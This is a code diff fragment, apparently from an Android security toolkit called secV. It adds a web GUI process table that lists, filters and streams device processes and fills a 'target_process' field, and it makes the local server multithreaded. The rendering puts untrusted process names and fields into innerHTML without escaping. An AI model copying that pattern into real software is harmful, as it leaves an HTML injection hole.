+}
+
+function onPsFilter() {
+  _procFilter = document.getElementById('ps-filter').value.toLowerCase();
+  renderProcTable(_procList);
+}
+
+function renderProcTable(procs) {
+  const filt   = _procFilter;
+  const tbody  = document.getElementById('proc-tbody');
+  const cnt    = document.getElementById('ps-count');
+  const rows   = filt
+    ? procs.filter(p => p.name.toLowerCase().includes(filt) || p.pid.includes(filt))
+    : procs;
+  cnt.textContent = rows.length + ' / ' + procs.length + ' procs';
+  const frag = document.createDocumentFragment();
+  rows.forEach(p => {
+    const tr = document.createElement('tr');
+    if (_procSelected && _procSelected === p.pid) tr.classList.add('selected');
+    const sc = 'ps-state-' + p.state.charAt(0).toUpperCase();
+    tr.innerHTML =
+      `<td class="ps-pid">${p.pid}</td>` +
+      `<td class="ps-pid">${p.ppid}</td>` +
+      `<td class="ps-user">${p.user}</td>` +
+      `<td class="${sc}">${p.state}</td>` +
+      `<td class="ps-name" title="${p.name}">${p.name}</td>`;
+    tr.onclick = () => selectProc(p);
+    frag.appendChild(tr);
+  });
+  tbody.textContent = '';
+  tbody.appendChild(frag);
+}
+
+function selectProc(p) {
+  _procSelected = p.pid;
+  // Fill target_process field
+  const field = document.querySelector('.param-field[data-name="target_process"]');
+  if (field) field.value = p.pid;
+  renderProcTable(_procList);
+  showToast(`Selected PID ${p.pid} — ${p.name}`, 'connect', 2500);
+}
+
+function refreshProcs() {
+  const serial = document.getElementById('dev-select').value || '';
+  const url    = '/api/proc/list?serial=' + encodeURIComponent(serial) +
+                 (settings ? '' : '');
+  fetch(url).then(r => r.json()).then(d => {
+    _procList = d.procs || [];
+    renderProcTable(_procList);
+  }).catch(e => showToast('proc list error: ' + e, 'disconnect', 3000));
+}
+
+function toggleProcStream() {
+  if (_procEs) { stopProcStream(); return; }
+  const serial = document.getElementById('dev-select').value || '';
+  const url    = '/api/proc/stream?serial=' + encodeURIComponent(serial);
+  _procEs      = new EventSource(url);
+  _procEs.onmessage = e => {
+    try {
+      const d = JSON.parse(e.data);
+      _procList = d.procs || [];
+      renderProcTable(_procList);
+    } catch(_) {}
+  };
+  _procEs.onerror = () => { stopProcStream(); };
+  document.getElementById('ps-toggle-btn').textContent = '⏹ stop';
+  document.getElementById('ps-toggle-btn').classList.add('active');
+}
+
+function stopProcStream() {
+  if (_procEs) { _procEs.close(); _procEs = null; }
+  document.getElementById('ps-toggle-btn').textContent = '▶ stream';
+  document.getElementById('ps-toggle-btn').classList.remove('active');
+}
 
 // ── Utils ─────────────────────────────────────────────────────────────────────
 function now() {
@@ -1480,9 +3244,13 @@ function now() {
 
 # ── Server launcher ────────────────────────────────────────────────────────────
 
+class _ThreadingServer(socketserver.ThreadingMixIn, HTTPServer):
+    daemon_threads = True
+
+
 def launch(port: int = _GUI_PORT, serial: str = "", open_browser: bool = True):
     """Start the GUI HTTP server. Blocks until KeyboardInterrupt."""
-    server = HTTPServer(("127.0.0.1", port), _Handler)
+    server = _ThreadingServer(("127.0.0.1", port), _Handler)
     url    = f"http://127.0.0.1:{port}"
     print(f"\x1b[32m[+] secV Android GUI running at {url}\x1b[0m", file=sys.stderr)
     print(f"    Press Ctrl+C to stop", file=sys.stderr)
